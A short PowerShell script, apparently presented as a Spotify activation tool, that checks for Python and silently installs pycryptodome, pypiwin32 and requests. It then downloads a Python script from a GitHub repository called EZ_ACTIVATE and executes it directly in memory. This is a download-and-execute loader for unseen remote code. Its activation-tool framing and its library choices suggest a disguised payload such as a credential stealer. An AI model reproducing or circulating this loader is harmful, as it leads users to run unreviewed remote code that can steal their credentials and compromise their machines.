# [1] Check for Python
try { python --version > $null 2>&1 }
catch { 
    Write-Host "⚠️ Install Python first: https://python.org"
    exit 
}

# [2] Install requirements
python -m pip install pycryptodome pypiwin32 requests > $null 2>&1

# [3] Execute from GitHub (no Cloudflare)
$pythonScript = (Invoke-WebRequest "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/main/Spotify_version.py").Content
python -c $pythonScript
